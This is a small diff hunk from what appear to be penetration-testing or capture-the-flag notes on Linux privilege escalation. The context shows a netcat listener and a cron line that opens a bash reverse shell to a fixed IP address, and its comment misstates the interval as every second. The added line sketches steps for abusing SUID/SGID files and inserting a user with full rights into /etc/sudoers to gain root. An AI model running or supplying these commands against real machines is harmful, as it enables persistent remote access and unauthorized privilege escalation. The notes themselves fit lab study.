@@ -1081,3 +1081,4 @@ nc -lvnp 9999
 ```
 * * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1' (creates a reverse shell every second)
 ````
+find a suppicious file to use when doing the suid and sgid lookup, cd into the direcctory and run ./<file> and see what it does, run  /etc/sudoers "comrade ALL=(ALL:ALL) ALL" into command and see if it works, finally find the other command to exploit the machine to get higher privlege with sudo and you are now root
